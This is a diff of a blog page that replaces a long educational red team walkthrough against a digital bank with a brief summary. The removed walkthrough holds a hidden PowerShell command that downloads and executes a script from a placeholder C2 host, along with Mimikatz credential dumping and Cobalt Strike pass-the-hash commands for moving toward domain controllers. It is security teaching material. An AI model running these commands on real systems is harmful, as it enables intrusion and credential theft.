@@ -102,7 +102,7 @@
     </nav>
 
     <!-- Main Content -->
-    <main class="py-20 px-6 max-w-4xl mx-auto flex-grow w-full">
+    <main class="py-20 px-6 max-w-7xl mx-auto flex-grow w-full">
         <!-- Post Header -->
         <header class="mb-12 border-b border-slate-800 pb-12">
             <div class="flex items-center gap-4 text-xs font-mono text-slate-500 mb-6 uppercase tracking-widest">
@@ -115,135 +115,23 @@
             
             <div class="flex flex-wrap gap-2">
                 <!-- Tags populated by python -->
-                <!-- ['red teaming', 'apt simulation', 'fintech', 'spear phishing', 'lateral movement', 'domain compromise', 'cobalt strike', 'ethical hacking', 'cybersecurity', 'active directory'] -->
+                <!-- ethical-hacking, engagement -->
             </div>
         </header>
 
         <!-- Markdown Body -->
         <div class="markdown-content">
             <hr />
-<h2>Introduction to the FinTech Red Team Engagement</h2>
-<p>Welcome to this educational walkthrough of a Red Team operation conducted against a digital bank, simulating the tactics, techniques, and procedures (TTPs) of an Advanced Persistent Threat (APT) group. Our objective was to test the bank's defensive capabilities by attempting to compromise critical assets, specifically their Domain Controllers. This exercise highlights advanced concepts in ethical hacking and provides insights into real-world attack scenarios.</p>
-<p>A <strong>Red Team engagement</strong> is a full-scope, multi-layered attack simulation designed to challenge an organization's security posture by mimicking a sophisticated adversary. The goal isn't just to find vulnerabilities, but to test the effectiveness of people, processes, and technology in detecting and responding to an attack. An <strong>APT (Advanced Persistent Threat)</strong> refers to a stealthy and continuous computer hacking process, often targeting specific entities for business or political motives, over an extended period.</p>
-<p>Throughout this walkthrough, we will break down the complex steps involved, focusing on the "why" and "how" behind each action. We will explore how initial access was gained through social engineering, how we moved stealthily across the network, and ultimately, how Domain Controllers were compromised.</p>
-<h2>Reconnaissance</h2>
-<p>Reconnaissance is the initial phase of any Red Team operation, where we gather information about our target without directly interacting with their systems. For a financial institution, this often involves extensive <strong>OSINT (Open-Source Intelligence)</strong>. Our goal here was to identify potential attack vectors and specific targets for our spear-phishing campaign.</p>
-<h3>Understanding Our Target</h3>
-<p>Before launching any attacks, we spent considerable time understanding the digital bank's public-facing presence. This included:<br />
-*   Identifying key personnel roles through LinkedIn and corporate websites.<br />
-*   Discovering common email formats (e.g., <code>firstname.lastname@bank.com</code>).<br />
-*   Mapping publicly accessible infrastructure.<br />
-*   Understanding their operational rhythm and published news.</p>
-<p>While we don't have specific commands to show for OSINT, tools like <code>Maltego</code>, <code>theHarvester</code>, and public search engines are commonly used in this phase. The output would be a rich database of employee names, email addresses, and organizational structures.</p>
-<h2>Enumeration</h2>
-<p>In the context of this Red Team operation, traditional network enumeration (like port scanning) might have been limited initially to avoid detection. Instead, a significant part of our "enumeration" involved identifying specific individuals who might be susceptible to social engineering, and understanding the bank's internal structure from external clues.</p>
-<h3>Identifying Phishing Targets</h3>
-<p>From our reconnaissance, we would have compiled a list of potential targets. For a spear-phishing attack, we look for individuals who might have access to sensitive information or whose roles make them likely to open a seemingly legitimate email. This includes IT staff, HR, or employees in finance departments.</p>
-<p>An example of enumerating email addresses could look like this (though this happens during reconnaissance, it directly feeds into the enumeration of targets for exploitation):</p>
-<pre class="codehilite"><code class="language-bash"># Hypothetical command to find email addresses using theHarvester
-theharvester -d examplebank.com -l 500 -b google,linkedin
-</code></pre>
-
-<p>🧠 Beginner Analysis:<br />
-*   <code>theharvester</code>: A common OSINT tool used to gather email addresses, subdomains, hosts, employee names, and more from public sources.<br />
-*   <code>-d examplebank.com</code>: Specifies the domain we are targeting.<br />
-*   <code>-l 500</code>: Sets the limit of results to 500.<br />
-*   <code>-b google,linkedin</code>: Specifies the data sources (Google search engine and LinkedIn) to use for gathering information.</p>
-<p>This command helps us build a list of potential employee email addresses, which are crucial for crafting a targeted spear-phishing campaign.</p>
-<h2>Exploitation</h2>
-<p>The exploitation phase details how we gained initial access to the internal network. For this engagement, spear-phishing was the chosen method, followed by leveraging the Cobalt Strike framework.</p>
-<h3>Initial Access via Spear-Phishing</h3>
-<p><strong>Spear-phishing</strong> is a highly targeted phishing attempt, where an attacker sends a personalized, deceptive email to a specific individual or small group. The goal is often to trick the recipient into revealing sensitive information, clicking a malicious link, or opening a malicious attachment.</p>
-<p>In this scenario, we crafted convincing emails, tailored to specific employees identified during reconnaissance. These emails often impersonate internal communications, vendor requests, or urgent policy updates. The payload was typically a document with a malicious macro.</p>
-<h4>The Malicious Document and Callback</h4>
-<p>When a target opens a macro-enabled document and enables the content (often prompted by social engineering), the embedded macro executes a piece of code. This code is designed to establish a covert channel back to our attacker-controlled server, known as a <strong>C2 (Command and Control)</strong> server.</p>
-<p>Here's a simplified example of what the macro's action might initiate (hypothetically, as actual macro code is often obfuscated):</p>
-<pre class="codehilite"><code class="language-powershell"># Hypothetical PowerShell command executed by a malicious macro
-powershell.exe -NoP -NonI -W Hidden -Exec Bypass -C &quot;IEX (New-Object Net.WebClient).DownloadString('http://our_c2_server/beacon.ps1')&quot;
-</code></pre>
-
-<p>🧠 Beginner Analysis:<br />
-*   <code>powershell.exe</code>: Executes the PowerShell command-line interface.<br />
-*   <code>-NoP</code>: No Profile (prevents loading the PowerShell profile).<br />
-*   <code>-NonI</code>: Non Interactive (prevents an interactive shell from appearing).<br />
-*   <code>-W Hidden</code>: Window Hidden (runs the PowerShell window in the background, out of sight).<br />
-*   <code>-Exec Bypass</code>: Execution Policy Bypass (allows unsigned scripts to run, bypassing security restrictions).<br />
-*   <code>-C</code>: Command (specifies the command to execute).<br />
-*   <code>IEX (New-Object Net.WebClient).DownloadString('http://our_c2_server/beacon.ps1')</code>: This is the core of the attack.<br />
-    *   <code>New-Object Net.WebClient</code>: Creates an object to interact with web resources.<br />
-    *   <code>.DownloadString('http://our_c2_server/beacon.ps1')</code>: Downloads a script (in this case, named <code>beacon.ps1</code>) from our C2 server.<br />
-    *   <code>IEX</code>: <code>Invoke-Expression</code> (executes the downloaded script in memory).</p>
-<p>This command effectively downloads and executes a script directly into memory, establishing a <strong>reverse shell</strong> or <strong>beacon</strong>. A <strong>reverse shell</strong> is a type of shell where the target machine initiates the connection back to the attacker, bypassing many firewall restrictions. In this operation, this callback was handled by <strong>Cobalt Strike</strong>.</p>
-<h4>Utilizing Cobalt Strike</h4>
-<p><strong>Cobalt Strike</strong> is a powerful commercial Red Team framework that facilitates post-exploitation activities, including managing beacons (reverse shells), lateral movement, and data exfiltration. Once the macro executed, our Cobalt Strike team server received a new "beacon" connection, signifying initial access to an employee's workstation within the bank's network. This beacon provides us with a foothold and a channel for further commands.</p>
-<h2>Privilege Escalation</h2>
-<p>After gaining initial access on a standard user's workstation, the next critical step is <strong>privilege escalation</strong>. This involves gaining higher-level access on the compromised machine itself. Our goal is typically to achieve <code>SYSTEM</code> privileges on Windows machines or <code>root</code> on Linux, which grants complete control over the host.</p>
-<h3>Local Privilege Escalation on Initial Host</h3>
-<p>While the raw data doesn't specify <em>how</em> privilege escalation occurred, common techniques include:<br />
-*   <strong>Kernel Exploits</strong>: Leveraging unpatched operating system vulnerabilities.<br />
-*   <strong>Misconfigured Services</strong>: Exploiting services running with elevated privileges that can be manipulated.<br />
-*   <strong>Weak Service Permissions</strong>: Finding services or files that can be modified or replaced to execute our code as a privileged user.<br />
-*   <strong>AlwaysInstallElevated</strong>: A misconfiguration in Group Policy that allows any user to install MSI packages with elevated privileges.<br />
-*   <strong>Credential Dumping</strong>: Extracting credentials (hashes or cleartext) from memory or the Security Account Manager (SAM) database, though this is often a precursor to lateral movement rather than pure local privilege escalation.</p>
-<p>Let's assume, for educational purposes, we identified a misconfigured service that could be exploited. For example, a service running as <code>SYSTEM</code> with a modifiable executable path.</p>
-<pre class="codehilite"><code class="language-powershell"># Hypothetical command to check service permissions
-icacls C:\Program Files\VulnerableService\vulnerableservice.exe
-</code></pre>
-
-<p>🧠 Beginner Analysis:<br />
-*   <code>icacls</code>: A Windows command-line utility used to display or modify Access Control Lists (ACLs) of files and folders, showing who has what permissions.<br />
-*   <code>C:\Program Files\VulnerableService\vulnerableservice.exe</code>: The path to a hypothetical service executable we suspect might have weak permissions.</p>
-<p>If the output of <code>icacls</code> showed that "Authenticated Users" or "Everyone" had "Modify" permissions on this executable, we could replace it with our own malicious executable (e.g., one that launches a reverse shell with <code>SYSTEM</code> privileges). The next time the service starts, our malicious code executes with <code>SYSTEM</code> privileges, granting us full control over the workstation.</p>
-<h2>Lateral Movement</h2>
-<p>With <code>SYSTEM</code> privileges on an initial workstation, our next objective was <strong>lateral movement</strong>. This is the process of moving from one compromised machine to other machines within the network, often with the ultimate goal of reaching high-value targets like Domain Controllers.</p>
-<h3>Techniques for Moving Across the Network</h3>
-<p>Lateral movement is crucial for expanding our presence and reaching our ultimate objectives. We often use credentials or session tokens obtained from the initial host to authenticate to other systems.</p>
-<p>Common techniques include:<br />
-*   <strong>Pass-the-Hash (PtH)</strong>: Reusing an NTLM hash of a user's password to authenticate to another system without knowing the cleartext password.<br />
-*   <strong>Pass-the-Ticket (PtT)</strong>: Using a stolen Kerberos ticket to authenticate to network services.<br />
-*   <strong>PsExec</strong>: A Microsoft Sysinternals tool (often abused by attackers) that allows executing commands on remote Windows systems.<br />
-*   <strong>Windows Management Instrumentation (WMI)</strong>: A powerful interface for managing Windows systems, which can be used to execute commands remotely.<br />
-*   <strong>Remote Desktop Protocol (RDP)</strong>: Using stolen credentials to log into other machines directly.</p>
-<p>In this engagement, Cobalt Strike played a central role in executing these lateral movement techniques, often leveraging built-in modules or custom scripts.</p>
-<p>Let's illustrate with a hypothetical PsExec-like command from our Cobalt Strike beacon:</p>
-<pre class="codehilite"><code class="language-powershell"># Hypothetical Cobalt Strike command to move laterally using PsExec
-# This would be executed within the Cobalt Strike console or a shell on the compromised host.
-pth_cred = mimikatz_sekurlsa::logonpasswords
-# Use a stolen hash to launch a new beacon on a target machine
-beacon&gt; psexec &lt;target_IP&gt; &lt;hash&gt;
-</code></pre>
-
-<p>🧠 Beginner Analysis:<br />
-*   <code>mimikatz_sekurlsa::logonpasswords</code>: This is a conceptual call to Mimikatz (a post-exploitation tool often used by Red Teams and threat actors) to dump credentials (hashes and sometimes cleartext passwords) from the memory of the current machine.<br />
-*   <code>pth_cred = ...</code>: We're conceptualizing storing the dumped credential hash.<br />
-*   <code>beacon&gt; psexec &lt;target_IP&gt; &lt;hash&gt;</code>: This represents a command within the Cobalt Strike console.<br />
-    *   <code>psexec</code>: Cobalt Strike's module to perform PsExec-like lateral movement.<br />
-    *   <code>&lt;target_IP&gt;</code>: The IP address of the next target machine we want to move to (e.g., another workstation, or even a server).<br />
-    *   <code>&lt;hash&gt;</code>: The NTLM hash obtained from Mimikatz. Cobalt Strike uses this hash to authenticate and execute a new beacon on the target machine without needing the actual password.</p>
-<p>This process would be repeated, hop by hop, identifying administrative users, their workstations, and ultimately, targeting servers and Domain Controllers.</p>
-<h2>Compromising Domain Controllers</h2>
-<p>The ultimate goal of this Red Team engagement was to compromise the Domain Controllers. A <strong>Domain Controller (DC)</strong> is a server that responds to security authentication requests (logging in, checking permissions, etc.) within a Windows domain. It's the central authority for managing user accounts, security policies, and network resources in an Active Directory environment. Compromising a DC means full control over the entire domain.</p>
-<h3>Gaining Control of Domain Controllers</h3>
-<p>After extensive lateral movement, we would have likely accumulated administrative credentials (hashes or cleartext passwords) for domain administrators. These credentials are the golden key to the Domain Controllers.</p>
-<p>Our process would involve:<br />
-1.  <strong>Identifying Domain Administrators</strong>: Through credential dumping on various hosts, we would eventually identify users with <code>Domain Admin</code> privileges.<br />
-2.<br />
-Let's imagine we obtained a Domain Administrator's NTLM hash. We could then use it to establish a direct session with the Domain Controller:</p>
-<pre class="codehilite"><code class="language-powershell"># Hypothetical Cobalt Strike command to launch a new beacon directly on a Domain Controller
-beacon&gt; psexec &lt;Domain_Controller_IP&gt; &lt;Domain_Admin_hash&gt;
-</code></pre>
-
-<p>🧠 Beginner Analysis:<br />
-*   This command is similar to the lateral movement step, but now the <code>&lt;target_IP&gt;</code> is a Domain Controller, and <code>&lt;Domain_Admin_hash&gt;</code> is the NTLM hash of a user with full administrative rights over the entire Active Directory domain.</p>
-<p>Once this command executes successfully, we would receive a new Cobalt Strike beacon directly from the Domain Controller. This signifies a full compromise. From this point, we could dump all user hashes (including those of other Domain Admins, service accounts, etc.), modify group policies, create new users, and effectively control the entire bank's Active Directory infrastructure.</p>
-<h2>Key Achievements &amp; Conclusion</h2>
-<p>This Red Team engagement successfully demonstrated the bank's vulnerability to a sophisticated APT-like attack. The core achievements included:</p>
+<h1>FinTech Red Team Engagement</h1>
+<p>Conducted a full-scope Red Team operation against a digital bank, simulating an APT group. Successfully compromised domain controllers via spear-phishing and lateral movement.</p>
+<h2>Project Overview</h2>
+<p>This project explores advanced concepts in <strong>ethical-hacking</strong>.</p>
+<h2>Key Achievements</h2>
 <ul>
-<li><strong>Implemented core functionality using Cobalt Strike</strong>: Cobalt Strike was instrumental throughout the operation, from managing initial beacons to facilitating lateral movement and command execution on compromised systems. Its capabilities allowed for stealthy and efficient operations.</li>
-<li><strong>Demonstrated expertise in Red Teaming</strong>: The successful compromise of Domain Controllers showcased advanced understanding of attack methodologies, target exploitation, and the ability to operate effectively within an enterprise network.</li>
-<li><strong>Documented findings in a detailed technical report</strong>: All actions, observations, and findings were meticulously documented in a technical report for the bank's security team. This report included actionable recommendations for improving their defensive posture.</li>
+<li>Implemented core functionality using <strong>Cobalt Strike</strong>.</li>
+<li>Demonstrated expertise in <strong>Red Teaming</strong>.</li>
+<li>Documented findings in a detailed technical report.</li>
 </ul>
-<p>This exercise serves as a powerful reminder of the importance of layered security, robust detection capabilities, and continuous improvement in an organization's security posture. For entry-level cybersecurity students, understanding these attack pathways is crucial for building effective defenses and becoming proficient security professionals.</p>
         </div>
     </main>
 
